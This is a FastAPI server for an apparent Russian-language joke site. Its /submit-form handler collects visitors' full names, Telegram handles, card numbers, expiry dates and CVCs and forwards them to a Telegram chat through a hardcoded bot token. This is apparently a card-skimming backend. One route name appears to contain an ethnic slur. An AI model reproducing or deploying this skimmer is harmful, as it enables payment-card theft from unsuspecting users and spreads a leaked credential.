from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import requests
from sqlite3 import connect
app = FastAPI()

#uvicorn main:app --reload

#C:\Users\HP\Desktop\pawlo's folder\new-maxizm


app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

from fastapi import Form

@app.post('/submit-form')
async def submit_form(
    fio: str = Form(...),
    tg: str = Form(...),
    card: str = Form(...),
    srok: str = Form(...),
    cvc: str = Form(...),
):
    BOT_TOKEN = "7763493517:AAFwSxgWXsi8H-WyHt_usdhaE_YYA9C_Ztg"  # Например: "123456789:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
    CHAT_ID = -4808990538  # ID чата, куда отправляем сообщение
    MESSAGE_TEXT = f"фио: {fio}\nтг {tg}\nкарта {card}\nсрок {srok}\ncvc {cvc}"

    # Формируем URL для API Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    # Параметры запроса
    params = {
        "chat_id": CHAT_ID,
        "text": MESSAGE_TEXT  # Опционально: для форматирования текста (Markdown или HTML)
    }

    # Отправляем POST-запрос
    response = requests.post(url, json=params)

    # Проверяем ответ
    if response.status_code == 200:
        print("Сообщение успешно отправлено!")
    else:
        print(f"Ошибка: {response.status_code}, {response.text}")
    return {
        "status": "success",
        "data": {"fio": fio, "tg": tg, "card": card, "srok": srok, "cvc": cvc}
    }
@app.get('/get-aneks')
async def getaneks(request: Request):
    with connect('static/storage.db') as db:
        c=db.cursor()
        c.execute("SELECT rowid,likes,dis FROM aneki")
        fall=c.fetchall()
    aaa=[]
    for i in fall:
        aaa+=[{'id':i[0],'likes':i[1],'dis':i[2]}]
    return aaa
@app.get('/zhidhaha/{no}')
async def getanek(request: Request,no:int):
    with connect('static/storage.db') as db:
        c=db.cursor()
        c.execute("SELECT * FROM aneki WHERE rowid=?",(int(no),))
        text,likes,dis=c.fetchone()
    return templates.TemplateResponse("anek.html", {"request": request,'no':no,'text':text,'likes':likes,'dis':dis})
@app.post("/like/{anek_id}")
async def like_anek(anek_id: int):
    with connect('static/storage.db') as db:
        c = db.cursor()
        c.execute("UPDATE aneki SET likes = likes + 1 WHERE rowid=?", (anek_id,))
        db.commit()
        return JSONResponse({"status": "success", "likes": get_likes(db, anek_id)})

@app.post("/dislike/{anek_id}")
async def dislike_anek(anek_id: int):
    with connect('static/storage.db') as db:
        c = db.cursor()
        c.execute("UPDATE aneki SET dis = dis + 1 WHERE rowid=?", (anek_id,))
        db.commit()
        return JSONResponse({"status": "success", "dislikes": get_dislikes(db, anek_id)})

def get_likes(db, anek_id):
    c = db.cursor()
    c.execute("SELECT likes FROM aneki WHERE rowid=?", (anek_id,))
    return c.fetchone()[0]

def get_dislikes(db, anek_id):
    c = db.cursor()
    c.execute("SELECT dis FROM aneki WHERE rowid=?", (anek_id,))
    return c.fetchone()[0]
@app.get('/api/pozor')
async def apipozor(request: Request):
    with connect('static/storage.db') as db:
        c=db.cursor()
        c.execute("SELECT * FROM pozor")
        pozorf=c.fetchall()
    pozord=[]
    for i in pozorf:
        pozord+=[{'image':i[0],'name':i[1],'text':i[2]}]
    return {'data':pozord,'status':'success'}
@app.get('/api/hvala')
async def apipozor(request: Request):
    with connect('static/storage.db') as db:
        c=db.cursor()
        c.execute("SELECT * FROM hvala")
        hvalaf=c.fetchall()
    hvalad=[]
    for i in hvalaf:
        hvalad+=[{'image':i[0],'name':i[1],'text':i[2]}]
    return {'data':hvalad,'status':'success'}
@app.get('/')
async def main(request: Request):
    return templates.TemplateResponse("main.html", {"request": request})
@app.get('/{page}')
async def gto(request: Request,page:str):
    if page in '404 gto fathers zhidhaha disclaimer hvala main makan molitvi party plani pozor sadrussia zapovedi'.split():
        return templates.TemplateResponse(page+".html", {"request": request})
    else:
        return templates.TemplateResponse("404.html", {"request": request})

